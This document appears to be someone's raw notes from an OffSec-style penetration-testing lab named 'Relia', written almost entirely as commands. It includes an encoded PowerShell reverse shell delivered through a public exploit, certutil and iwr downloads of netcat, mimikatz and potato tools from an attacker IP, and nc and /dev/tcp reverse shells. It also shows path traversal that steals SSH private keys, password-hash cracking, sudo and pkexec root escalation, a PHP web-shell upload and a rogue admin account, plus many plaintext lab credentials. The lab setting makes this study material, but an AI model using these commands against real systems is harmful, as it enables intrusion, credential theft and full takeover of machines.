python3 49488.py -u mark@relia.com -p OathDeeplyReprieve91 -i http://web02.relia.com:14080/ -c "powershell -env JExIT1NUID0gIjE5Mi4xNjguNDUuMTY2IjsgJExQT1JUID0gNjY2NjsgJFRDUENsaWVudCA9IE5ldy1PYmplY3QgTmV0LlNvY2tldHMuVENQQ2xpZW50KCRMSE9TVCwgJExQT1JUKTsgJE5ldHdvcmtTdHJlYW0gPSAkVENQQ2xpZW50LkdldFN0cmVhbSgpOyAkU3RyZWFtUmVhZGVyID0gTmV3LU9iamVjdCBJTy5TdHJlYW1SZWFkZXIoJE5ldHdvcmtTdHJlYW0pOyAkU3RyZWFtV3JpdGVyID0gTmV3LU9iamVjdCBJTy5TdHJlYW1Xcml0ZXIoJE5ldHdvcmtTdHJlYW0pOyAkU3RyZWFtV3JpdGVyLkF1dG9GbHVzaCA9ICR0cnVlOyAkQnVmZmVyID0gTmV3LU9iamVjdCBTeXN0ZW0uQnl0ZVtdIDEwMjQ7IHdoaWxlICgkVENQQ2xpZW50LkNvbm5lY3RlZCkgeyB3aGlsZSAoJE5ldHdvcmtTdHJlYW0uRGF0YUF2YWlsYWJsZSkgeyAkUmF3RGF0YSA9ICROZXR3b3JrU3RyZWFtLlJlYWQoJEJ1ZmZlciwgMCwgJEJ1ZmZlci5MZW5ndGgpOyAkQ29kZSA9IChbdGV4dC5lbmNvZGluZ106OlVURjgpLkdldFN0cmluZygkQnVmZmVyLCAwLCAkUmF3RGF0YSAtMSkgfTsgaWYgKCRUQ1BDbGllbnQuQ29ubmVjdGVkIC1hbmQgJENvZGUuTGVuZ3RoIC1ndCAxKSB7ICRPdXRwdXQgPSB0cnkgeyBJbnZva2UtRXhwcmVzc2lvbiAoJENvZGUpIDI+JjEgfSBjYXRjaCB7ICRfIH07ICRTdHJlYW1Xcml0ZXIuV3JpdGUoIiRPdXRwdXRgbiIpOyAkQ29kZSA9ICRudWxsIH0gfTsgJFRDUENsaWVudC5DbG9zZSgpOyAkTmV0d29ya1N0cmVhbS5DbG9zZSgpOyAkU3RyZWFtUmVhZGVyLkNsb3NlKCk7ICRTdHJlYW1Xcml0ZXIuQ2xvc2UoKQ=="
#Error 
python3 49488.py -u mark@relia.com -p OathDeeplyReprieve91 -i http://web02.relia.com:14080/ -c powershell.exe -a" -e JExIT1NUID0gIjE5Mi4xNjguNDUuMTY2IjsgJExQT1JUID0gNjY2NjsgJFRDUENsaWVudCA9IE5ldy1PYmplY3QgTmV0LlNvY2tldHMuVENQQ2xpZW50KCRMSE9TVCwgJExQT1JUKTsgJE5ldHdvcmtTdHJlYW0gPSAkVENQQ2xpZW50LkdldFN0cmVhbSgpOyAkU3RyZWFtUmVhZGVyID0gTmV3LU9iamVjdCBJTy5TdHJlYW1SZWFkZXIoJE5ldHdvcmtTdHJlYW0pOyAkU3RyZWFtV3JpdGVyID0gTmV3LU9iamVjdCBJTy5TdHJlYW1Xcml0ZXIoJE5ldHdvcmtTdHJlYW0pOyAkU3RyZWFtV3JpdGVyLkF1dG9GbHVzaCA9ICR0cnVlOyAkQnVmZmVyID0gTmV3LU9iamVjdCBTeXN0ZW0uQnl0ZVtdIDEwMjQ7IHdoaWxlICgkVENQQ2xpZW50LkNvbm5lY3RlZCkgeyB3aGlsZSAoJE5ldHdvcmtTdHJlYW0uRGF0YUF2YWlsYWJsZSkgeyAkUmF3RGF0YSA9ICROZXR3b3JrU3RyZWFtLlJlYWQoJEJ1ZmZlciwgMCwgJEJ1ZmZlci5MZW5ndGgpOyAkQ29kZSA9IChbdGV4dC5lbmNvZGluZ106OlVURjgpLkdldFN0cmluZygkQnVmZmVyLCAwLCAkUmF3RGF0YSAtMSkgfTsgaWYgKCRUQ1BDbGllbnQuQ29ubmVjdGVkIC1hbmQgJENvZGUuTGVuZ3RoIC1ndCAxKSB7ICRPdXRwdXQgPSB0cnkgeyBJbnZva2UtRXhwcmVzc2lvbiAoJENvZGUpIDI+JjEgfSBjYXRjaCB7ICRfIH07ICRTdHJlYW1Xcml0ZXIuV3JpdGUoIiRPdXRwdXRgbiIpOyAkQ29kZSA9ICRudWxsIH0gfTsgJFRDUENsaWVudC5DbG9zZSgpOyAkTmV0d29ya1N0cmVhbS5DbG9zZSgpOyAkU3RyZWFtUmVhZGVyLkNsb3NlKCk7ICRTdHJlYW1Xcml0ZXIuQ2xvc2UoKQ=="

> "certutil -urlcache -f http://192.168.45.166:8000/nc.exe c:/windows/temp/nc.exe";--
>c:\windows\temp\nc.exe 192.168.45.166 6666 -e cmd.exe

# Hint - https://gist.githubusercontent.com/tothi/ab288fb523a4b32b51a53e542d40fe58/raw/40ade3fb5e3665b82310c08d36597123c2e75ab4/mkpsrevshell.py chat link Discord 
>python3 mkpsrevshell.py 192.168.45.189 6666       
#Above github link generated a payload                                                                            
powershell -e JABj....................AApAA==
kali>nc -lnvp 6666

> python3 49488.py -u mark@relia.com -p OathDeeplyReprieve91 -i http://web02.relia.com:14080/ -c powershell.exe -a "-e JABj...........AApAA=="
kali>whoami
#Got shell 
>iwr -uri http://192.168.45.189:8000/DeadPotato-NET4.exe -Outfile DeadPotato-NET4.exe
>iwr -uri http://192.168.45.189:8000/mimicatz.exe -Outfile mimicatz.exe
>iwr -uri http://192.168.45.208:8000/winPEASx64.exe -Outfile winPEASx64.exe
>iwr -uri http://192.168.45.189:8000/Lagent.exe -Outfile Lagent.exe

>net user (# Found new user - zachary)
> iwr -uri http://192.168.45.208:8000/PowerView.ps1 -Outfile PowerView.ps1
#PS C:\Windows\Temp> ls
    Directory: C:\Windows\Temp
> Invoke-Module .\PowerView.ps1
> Find-LocalAdminAccess
> Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion
> Get-NetUser
> Get-NetUser
#Active Directory commands are not working.
> net user (# Working new user find zachary)

#Search windows .txt files in powershell using Get-ChildItem
>Get-ChildItem -Path C:\Users -Filter *.txt -Recurse 
#Proof.txt
> type C:\xampp\webdav\webdav.txt                     
URL: http://localhost/webdav/
User: wampp Password: xampp
E-Mail-Adresse bei Dreamweaver angeben. 
Lokales Directory: /xampp/webdav/

#Tring to RUN the winPEAS but not running since one hour, seek for hint
#Hint - Consider getting an interactive shell using conptyshell

#ConptyShell (https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1) Usage (https://github.com/antonioCoco/ConPtyShell)
>iwr -uri http://192.168.45.189:8000/Invoke-ConPtyShell.ps1 -Outfile Invoke-ConPtyShell.ps1

#Server Side - Kali
>stty raw -echo; (stty size; cat) | nc -lvnp 3001

#CLient  Side - Target 
>Invoke-ConPtyShell 192.168.45.189 3001 
#Not worked
>Remove-Item Invoke-ConPtyShell.ps1 

>stty raw -echo; (stty size; cat) | nc -lvnp 3001
>IEX(IWR http://192.168.45.189:8000/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell -RemoteIp 192.168.45.189 -RemotePort 3001 -Rows 24 -Cols 80
# This time it worked but,

 When RUN ls command output printing takes 5 minutes 
 
 >iwr -uri http://192.168.45.189:8000/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
 
 EXITed from this no information as per offsec SME
 
 
 192.168.223.248
 
 
 >smbclient -L //192.168.223.248
 >smb: \log\....\>get web.config
 #web.config file has credentials 
 
 #Database.kdbx file  (\logs\build\materials\assets\Databases\> get Database.kdbx )
 >keepass2john Database.kdbx > keepass.hash
! Database.kdbx : Unknown format: File signature invalid
#It's invalid signature

>smb: \DB-back (1)\New Folder\Emma\Documents\> get Database.kdbx
#Deleted Previous file
>keepass2john Database.kdbx > keepass.hash
>hashcat -m 13400 keepass.hash  /home/kali/HTB/OSCP/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule
>john keepass.hash

#Crackmapexec with all ftp, ssh, smb, mssql, rdp, ldap, winr,
>crackmapexec rdp 192.168.161.189-250 -u users.txt -p pass.txt --continue-on-success
>netexec mssql 192.168.161.189-250 -u users.txt -p pass.txt --continue-on-success

>xfreerdp /u:emma /p:welcome1 /v:192.168.243.248 /smart-sizing:1920x1080 /cert-ignore with /d:external , /d:external.relia.com
>hydra -L users.txt -P pass.txt 192.168.243.248 rdp
>nxc rdp 192.168.243.248 -u users.txt -p pass.txt
>crackmapexec rdp 192.168.243.248 -u emma -p welcome1 
>nxc rdp 192.168.243.248 -u emma -p welcome1 

#Hint - Right, open the kdbx file with the password you got. You can use kpcli
>kpcli --kdb=Database.kdbx (#Password - welcome)
>ls
>cd Databases
>cd Windows
>show emma
#Password show in hide RED, select with mouse it will unhide multiple times. 

>xfreerdp /u:emma /p:SomersetVinyl1! /v:192.168.243.248 /smart-sizing:1920x1080 /cert-ignore
#Got the shell

```

### Relia - 192.168.243.248 - Betamonitor, SSH file with different names

```jsx
>xfreerdp /u:emma /p:SomersetVinyl1! /v:192.168.243.248 /smart-sizing:1920x1080 /cert-ignore
#Got the shell

#Start priv Esc

> iwr -uri http://192.168.45.208:8000/winPEASx64.exe -Outfile winPEASx64.exe
PS C:\Users\emma> iwr -uri http://192.168.45.208:8000/PowerView.ps1 -Outfile PowerView.ps1
> iwr -uri http://192.168.45.208:8000/nc.exe -Outfile nc.exe

#Windows
>.\nc.exe 192.168.45.208 6666 -e cmd.exe

#kali
>nc -nlvp 6666
>.\winPEASx64.exe

Revealed some information
#dev.testlab.local  (TESTLAB\dfm.a - Password123!)
#external.local
#prod.testlab.local
#windows1.testlab.local, windows2.testlab.local

#Unquoted path  
C:\Program Files (x86)\Microsoft\Edge\Application\107.0.1418.26\Installer\setup.exe
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini 

#Scheduled Applications --Non Microsoft--
Check if you can modify other users scheduled binaries https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries
(Administrator) BetaTask: C:\BetaMonitor\BetaMonitor.exe 

>msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.189 LPORT=4444 -f exe -o met4444.exe
> iwr -uri http://192.168.45.189:8000/met4444.exe -Outfile met.exe
>C:\BetaMonitor
#Unable move the file neither of this GUI and cli
>Hint - dir env:
#AppKey value - !8@aBRBYdb3! (# I think this password for admin, while used for moving BetaMonitor.exe file, But not worked)

#Hint - you should check the "log" and see what you find more and follow the "puzzle" -> you should do a dir on the env and you will loot something good

#Hint - Have your read the log file yet? C:\BetaMonitor\BetaMonitor.log  that gives you clues for the next step. Also, carefully read the shared message again that gives you the command that you may want to use as a next step.

# Coudln't find BetaLibrary.Dll.
>x86_64-w64-mingw32-gcc file.cpp --shared -o file.dll   
# Error - x86_64-w64-mingw32-gcc: fatal error: cannot execute ‘cc1plus’: execvp: No such file or directory
compilation terminated.
                           
#Solved
>sudo apt-get install g++-mingw-w64

>iwr -uri http://192.168.45.189:8000/file.dll -Outfile file.dll
#Unable move the file into C:\BetaMonitor\ path.

PS C:\BetaMonitor> icacls .\BetaMonitor.exe
.\BetaMonitor.exe BUILTIN\Users:(I)(RX)
                  NT AUTHORITY\SYSTEM:(I)(F)
                  BUILTIN\Administrators:(I)(F)

Successfully processed 1 files; Failed processing 0 files

#Hint - Add ENV: “ !8@aBRBYdb3! ” into the password file try rdp
>xfreerdp /u:mark /p:'!8@aBRBYdb3! ' /v:192.168.243.248 /smart-sizing:1920x1080 /cert-ignore

#Got access to Administrator group with mark user, but not admin

 192.168.223.249
 
locate .nse | grep smb
nmap -p445 --script="name" 192.168.239.249

>crackmapexec rdp 192.168.239.249,246 -u users.txt -p pass.txt  --continue-on-success
>hydra -L users.txt -P pass.txt 192.168.239.249 rdp
#No hit 

>./50383.sh ip.txt /etc/passwd (All IPs here 189,191,245,246,247,248,249,250)

#for 245 identified new uses (miranda, steven, mark, anita,offsec)

>hydra -L users.txt -P pass.txt 192.168.239.245 ssh -s 2222
#Doesn't support password authentication, May be try identifying ssh key in the user folders.
#No keys are avaliable

>./50383.sh ip.txt /home/anita/local.txt (# Got flag, mean anita active user)

#Tried this one for shell (https://github.com/thehackersbrain/CVE-2021-41773)  Not successful
>python3 exploit.py -t 192.168.239.245 (Exploit renamed as CVE-2021-41773) 

>curl 'http://192.168.239.245:8000/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd'  (passwd)

#Hint - The private key might have a different name, you can check this resource: https://askubuntu.com/questions/30788/does-ssh-key-need-to-be-named-id-rsa
(id_rsa, id_ecdsa, id_ecdsa_sk, id_ed25519, id_ed25519_sk)

>curl 'http://192.168.239.245:8000/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/home/anita/.ssh/id_ecdsa' 

>ssh -i anita245_id_ecdsa anita@192.168.239.245 -p 2222
#Asking for password let's crack using ssh2john

anita245_id_ecdsa:$sshng$6$16$0ef9e445850d777e7da427caa9b729cc$359$6f70656e7373682d6b65792d7631000000000a6165733235362d6374720000000662637279707400000018000000100ef9e445850d777e7da427caa9b729cc0000001000000001000000680000001365636473612d736861322d6e69737470323536000000086e697374703235360000004104afad8408da4537cd62d9d3854a02bf636ce8542d1ad6892c1a4b8726fbe2148ea75a67d299b4ae635384c7c0ac19e016397b449602393a98e4c9a2774b0d2700000000b0d0768117bce9ff42a2ba77f5eb577d3453c86366dd09ac99b319c5ba531da7547145c42e36818f9233a7c972bf863f6567abd31b02f266216c7977d18bc0ddf7762c1b456610e9b7056bef0affb6e8cf1ec8f4208810f874fa6198d599d2f409eaa9db6415829913c2a69da7992693de875b45a49c1144f9567929c66a8841f4fea7c00e0801fe44b9dd925594f03a58b41e1c3891bf7fd25ded7b708376e2d6b9112acca9f321db03ec2c7dcdb22d63$16$183

>curl 'http://192.168.239.245:8000/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/home/anita/.ssh/id_ecdsa'  | base64
>curl 'http://192.168.239.245:8000/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/home/anita/.ssh/id_ecdsa'  | based64 > anita245_id_ecdsa 

#Remove name of after that that it will look like this
$sshng$6$16$0ef9e445850d777e7da427caa9b729cc$359$6f70656e7373682d6b65792d7631000000000a6165733235362d6374720000000662637279707400000018000000100ef9e445850d777e7da427caa9b729cc0000001000000001000000680000001365636473612d736861322d6e69737470323536000000086e697374703235360000004104afad8408da4537cd62d9d3854a02bf636ce8542d1ad6892c1a4b8726fbe2148ea75a67d299b4ae635384c7c0ac19e016397b449602393a98e4c9a2774b0d2700000000b0d0768117bce9ff42a2ba77f5eb577d3453c86366dd09ac99b319c5ba531da7547145c42e36818f9233a7c972bf863f6567abd31b02f266216c7977d18bc0ddf7762c1b456610e9b7056bef0affb6e8cf1ec8f4208810f874fa6198d599d2f409eaa9db6415829913c2a69da7992693de875b45a49c1144f9567929c66a8841f4fea7c00e0801fe44b9dd925594f03a58b41e1c3891bf7fd25ded7b708376e2d6b9112acca9f321db03ec2c7dcdb22d63$16$183

>ssh2john anita245_id_ecdsa > anita245_id_ecdsa.hash

>john anita245_id_ecdsa.hash  (fireball)
>ssh -i anita245_id_ecdsa anita@192.168.239.245 -p 2222
#Logged IN

>sudo -l (No password for anita)
>wget http://192.168.45.189:8000/linpeas.sh 
>./linpeas.sh
```

### Relia - 192.168.239.245 - CVE-2021-3156 sudo Baron Samedit

```jsx
>john anita245_id_ecdsa.hash  (fireball)
>ssh -i anita245_id_ecdsa anita@192.168.239.245 -p 2222
#Logged IN

>sudo -l (No password for anita)
>wget http://192.168.45.189:8000/linpeas.sh 
>./linpeas.sh

╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester                                                                                                                     

[+] [CVE-2022-2586] nft_object UAF
   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
>└─$ gcc CVE-2022-2586.c -o exploit -lmnl -lnftnl -no-pie -lpthread
CVE-2022-2586.c:37:10: fatal error: libnftnl/chain.h: No such file or directory
   37 | #include <libnftnl/chain.h>
      |          ^~~~~~~~~~~~~~~~~~
compilation terminated.
   
[+] [CVE-2021-4034] PwnKit
   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   #https://www.exploit-db.com/exploits/50689
   $ ./exploit
./exploit: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by ./exploit)
#Need to be update libc6-dev Don't have access to sudo.

[+] [CVE-2021-3156] sudo Baron Samedit
   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
#49521.py ran the file generated some output but finally no ROOT   
   
[+] [CVE-2021-3156] sudo Baron Samedit 2
   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   
[+] [CVE-2021-22555] Netfilter heap out-of-bounds write
   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
>gcc 49522.c -o 49522 #Error while generating the file
>gcc 49522.c -o 49522 -lmnl -lnftnl -no-pie -lpthread 
   
[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)
   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
  https://github.com/theori-io/CVE-2022-32250-exploit
  >gcc exp.c -o exp -l mnl -l nftnl -w   #Error -exp.c:11:10: fatal error: libmnl/libmnl.h: No such file or directory
   11 | #include <libmnl/libmnl.h>

[+] [CVE-2017-5618] setuid screen v4.5.0 LPE
   Details: https://seclists.org/oss-sec/2017/q1/184
   https://medium.com/r3d-buck3t/overwriting-preload-libraries-to-gain-root-linux-privesc-77c87b5f3bf8 code https://www.exploit-db.com/exploits/41154
   #NO ROOTSHELL

#https://juggernaut-sec.com/cron-jobs-lpe/ (Still Anita user)

╔══════════╣ Cron jobs
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs                                                                                 
/usr/bin/crontab                                                                                                                                                       
incrontab Not Found
-rw-r--r-- 1 root root    1042 Feb 13  2020 /etc/crontab                                                                                                               

/etc/cron.d:
total 20
drwxr-xr-x  2 root root 4096 Oct 12  2022 .
drwxr-xr-x 98 root root 4096 Oct 28  2022 ..
-rw-r--r--  1 root root  201 Feb 14  2020 e2scrub_all
-rw-r--r--  1 root root  102 Feb 13  2020 .placeholder
-rw-r--r--  1 root root  191 Apr 23  2020 popularity-contest

/etc/cron.daily:
total 48
drwxr-xr-x  2 root root 4096 Oct 12  2022 .
drwxr-xr-x 98 root root 4096 Oct 28  2022 ..
-rwxr-xr-x  1 root root  376 Dec  4  2019 apport
-rwxr-xr-x  1 root root 1478 Apr  9  2020 apt-compat
-rwxr-xr-x  1 root root  355 Dec 29  2017 bsdmainutils
-rwxr-xr-x  1 root root 1187 Sep  5  2019 dpkg
-rwxr-xr-x  1 root root  377 Jan 21  2019 logrotate
-rwxr-xr-x  1 root root 1123 Feb 25  2020 man-db
-rw-r--r--  1 root root  102 Feb 13  2020 .placeholder
-rwxr-xr-x  1 root root 4574 Jul 18  2019 popularity-contest
-rwxr-xr-x  1 root root  214 Apr  2  2020 update-notifier-common

I tried the things LINUX EXPLOIT SUGGESTERS nohing worked

I tried this "CVE-2021-3156" one, generated some data, finally land on same user anita my sudo version - Sudo version 1.8.31
#Hint - Try this  https://raw.githubusercontent.com/worawit/CVE-2021-3156/main/exploit_nss.py

>./exploit_nss.py (#Got root shell)

#As per Offsec chat not inthe box

>ssh -i anita245_id_ecdsa anita@192.168.239.246 -p 2222 (fireball)

```

### Relia - 192.168.191.246 - pkexec, ssh

```jsx
>ssh -i anita245_id_ecdsa anita@192.168.239.246 -p 2222 (fireball)

>bash -i >& /dev/tcp/192.168.45.189/4455 0>&1
>nc -nlvp 4455
#Not worked get interactive shell

╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester                                                                                                                     
[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)            
# https://github.com/theori-io/CVE-2022-32250-exploit  (Leak Failed)

[+] [CVE-2022-2586] nft_object UAF
 # https://github.com/aels/CVE-2022-2586-LPE (Leak Failed)

[+] [CVE-2022-0847] DirtyPipe
   Details: https://dirtypipe.cm4all.com/
   Exposure: less probable
   Tags: ubuntu=(20.04|21.04),debian=11
   Download URL: https://haxx.in/files/dirtypipez.c
   >https://github.com/n3rada/DirtyPipe

[+] [CVE-2021-4034] PwnKit
   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: less probable
   Tags: ubuntu=10|11|12|13|14|15|16|17|18|19|20|21,debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit
   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: mint=19,ubuntu=18|20, debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2
   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: centos=6|7|8,ubuntu=14|16|17|18|19|20, debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write
   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2017-5618] setuid screen v4.5.0 LPE
   Details: https://seclists.org/oss-sec/2017/q1/184
   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154
   
 # based on that created searchsploit command
>searchsploit "linux kernel Ubuntu 22 Local Privilege Escalation"   | grep  "5." | grep -v " < 5.15.0" | grep -v "4.8"
# Found 2 exploits, first not root shell, 2 nd one compliation error

#Hint - Look at Linux PrivEsc Course, Check for ports open using ss -lntp, 

>ss -lntp (Apart from NMAP open ports, port 8000 is open menas /var/www/internal)
#But can't rearch from Firefoc http://192.168.153.246:8000/

>cd /var/www/internal
>ls -l (#Files are created by root)
>echo 'Ashok testing for writable permission' > ashok.txt
# Their is no writable -sh: 22: cannot create ashok.txt: Permission denied

#https://www.revshells.com/ (PHP PentestMoney), generated a payload.
>find / -writable -type d 2>/dev/null 
#Initially copied to /tmp, heraed in the chat /tmp has only read permission apart from that nc not having -e option for reverse shell, changed to /dev/shm

>wget http://192.168.45.189:8000/phpshell.php
>curl 'http://127.0.0.1:8000/backend/?view=../../../../../../../../etc/passwd'
>curl 'http://127.0.0.1:8000/backend/?view=../../../../../../../../dev/shm/phpshell.php'

#Got a shell using for www-data
>rlwrap nc -nlvp 6666

#Instead of this you can try ssh -L 8000:127.0.0.1:8000 -o "UserKnownHostsFile=/dev/null" -i id_ecdsa anita@192.168.237.246 -p 2222

>cat /etc/issue
>uname -a
>find / -perm -u=s -type f 2>/dev/null
/usr/bin/chsh - NO from Gtfonins
/usr/bin/pkexec -
/usr/bin/mount                                                                                                                                                         
/usr/bin/chfn                                                                                                                                                          
/usr/bin/su                                                                                                                                                            
/usr/bin/passwd                                                                                                                                                        
/usr/bin/newgrp                                                                                                                                                        
/usr/bin/umount                                                                                                                                                        
/usr/bin/fusermount3                                                                                                                                                   
/usr/bin/gpasswd                                                                                                                                                       
/usr/bin/sudo  

>sudo pkexec /bin/sh
# Some gap tried ENTER
>id  (# Got root)

#189,191,249 IPs with SMB, rdp
>crackmapexec smb 192.168.153.249 -u users.txt -p pass.txt --continue-on-success
>smbclient -L //192.168.153.189 or ////
# INformation moving forward

#Enumerate http ports 189, 
=191 - 80 auth, 
> xfreerdp /u:offsec /p:lab /v:192.168.153.249 /smart-sizing:1920x1080 /cert-ignore (191,249)
 

```

### Relia - 192.168.153.249  - Php file upload, git show.

```jsx
#Next his one sawin the chat and basic information from website port 8000

>xfreerdp /u:offsec /p:lab /v:192.168.153.249 /smart-sizing:1920x1080 /cert-ignore

>http://192.168.153.249:8000/dashboard/phpinfo.php
User - adrian

#Hint - there is another webserver running on a higher port, u need to enumerate that webserver instead

>whatweb http://192.168.179.249:8000/

>gobuster dir -u http://192.168.179.249:8000/ -w /usr/share/wordlists/dirb/big.txt
#Found - CMS, img, dashboard, xampp

#Hint - Try taking a look at the following PoC: https://www.exploit-db.com/exploits/50616
I tried both ritecms.v3.1.0/admin.php/admin.php any clue from here
#Hint - /cms/admin.php

#As per POC 50616 http://192.168.232.249:8000/cms/admin.php (Logged in with admin:admin credentials, tried some other)

Payload revshells.com (PHP PentestMonkey) payload
>http://192.168.232.249:8000/cms/media/phpshell.pHP
#Error Mad me uploaded Linux shell uname error.

#Logged as adrian user
>curl  “http://192.168.232.249:8000/cms/media/simple-backdoor.pHP?cmd=type%20C:\Users\adrian\Desktop\local.txt”
>curl "http://192.168.232.249:8000/cms/media/simple-backdoor.pHP?cmd=whoami%20/priv"

Privilege Name                                     Description                                                                               State   
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                                                          Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication                         Enabled 
SeCreateGlobalPrivilege       Create global objects                    		                                          Enabled 

>certutil -urlcache -f http://192.168.45.236:8000/nc.exe c:/windows/temp/nc.exe
>curl "http://192.168.232.249:8000/cms/media/simple-backdoor.pHP?cmd=certutil%20-urlcache%20-f%20http%3A%2F%2F192.168.45.236%3A8000%2Fnc.exe%20c%3A%2Fwindows%2Ftemp%2Fnc.exe"
>rlwrap nc -nlvp 6666
>curl "http://192.168.232.249:8000/cms/media/simple-backdoor.pHP?cmd=c%3A%5Cwindows%5Ctemp%5Cnc.exe%20192.168.45.236%206666%20-e%20cmd.exe"

#No shell 
>dir /s /b C:/windows/temp/nc.exe working dir /s /b C:\Windows\ 
 
 # IN Browser URL
 #certutil -urlcache -f http://192.168.45.236:8000/nc.exe c:\Windows\Temp\nc.exe
 http://192.168.232.249:8000/cms/media/simple-backdoor.pHP?cmd=certutil%20-urlcache%20-f%20http://192.168.45.236:8000/nc.exe%20c:\Windows\Temp\nc.exe
#Check in the user directory 
>dir /s /b C:\Users\adrian\Desktop\
 
 >certutil -urlcache -f http://192.168.45.237:8000/nc.exe C:\Users\adrian\Desktop\nc.exe
 >dir /s /b C:\Users\adrian\Desktop\
 #Got it 
 >C:\Users\adrian\Desktop\nc.exe
 >C:\Users\adrian\Desktop\nc.exe 192.168.45.236 6666 -e cmd.exe
 #Got shell rlwrap nc -nlvp 6666
 #SeImpersonatePrivilege
 >iwr -uri http://192.168.45.237:8000/DeadPotato-NET4.exe -Outfile DeadPotato.exe
 >certutil -urlcache -f http://192.168.45.237:8000/DeadPotato-NET4.exe C:\Users\adrian\Desktop\DeadPotato.exe
 
 >DeadPotato.exe -cmd “whoami”
 >DeadPotato.exe -rev 192.168.45.237:9001
 >rlwrap nc -nlvp 9001
 #Not worked above one
 PS>iwr -uri http://192.168.45.236:8000/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
>.\PrintSpoofer64.exe -i -c powershell.exe
#
>.\DeadPotato.exe -newadmin ashok:Ashok@123
>net localgroup administrators
Members
-------------------------------------------------------------------------------
Administrator
ashok
damon
The command completed successfully.

# Create a PSCredential object with the username and password
$securePassword = ConvertTo-SecureString "Ashok@123" -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential("domain\ashok", $securePassword)
# Use Start-Process to run a command with the specified credentials
Start-Process "cmd.exe" -Credential $credential

# Domain
>systeminfo | findstr /B /C:"Domain"
>wmic computersystem get domain
>(Get-WmiObject Win32_ComputerSystem).Domain
>Test-Connection -ComputerName (Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object {$_.IPEnabled -eq $true} | Select-Object -First 1 -ExpandProperty DNSDomain)

>xfreerdp /u:ashok /p:Ashok@123 /v:192.168.232.249 /smart-sizing:1920x1080 /cert-ignore
#Got it

 Lateral Movement
 C:\Users\damon\.gitconfig file has (C:\staging)
 >C:\staging\htdocs\cms\data\sql\sqlite_userdata_init.sql
 INSERT INTO "rite_userdata" VALUES (1, 'admin', 1, '3e250c2bfd46362687d3a871c12b50c7d558904b65860c1bf5', 1614826028, 1);
COMMIT;
#Git folder
>git log 
>git config --global --add safe.directory C:/staging
#Add into safe directory
>git show 8b430c17c16e6c0515e49c4eafdd129f719fde74 (#Showing commits)
#May be Credentials
#maildmz@relia.com:DPuBT9tGCBrTbR
#Mail server responsiable for - jim@relia.com, User damian

>iwr -uri http://192.168.45.236:8000/winPEASx64.exe -Outfile winPEASx64.exe
> .\winPEASx64.exe
NetNTLMv2
adrian::LEGACY:1122334455667788:b08935a4bff5b4b9e3bc9f9a832f32ca:0101000000000000feaedee93ef4da018edfb7f69b4f32a300000000080030003000000000000000000000000030000082146719f9ffcad0d6bb9cacafae10cb01091039deba7596c4015f26a793b0290a00100000000000000000000000000000000000090000000000000000000000

>iwr -uri http://192.168.45.236:8000/mimicatz.exe -Outfile mimicatz.exe
 Lateral Movement
 C:\Users\damon\.gitconfig file has (C:\staging)
 >C:\staging\htdocs\cms\data\sql\sqlite_userdata_init.sql
 INSERT INTO "rite_userdata" VALUES (1, 'admin', 1, '3e250c2bfd46362687d3a871c12b50c7d558904b65860c1bf5', 1614826028, 1);
COMMIT;
#Git folder
#Hint - After getting hashes notable to crack check the git log at C:\statging
>git log 
>git config --global --add safe.directory C:/staging
#Add into safe directory
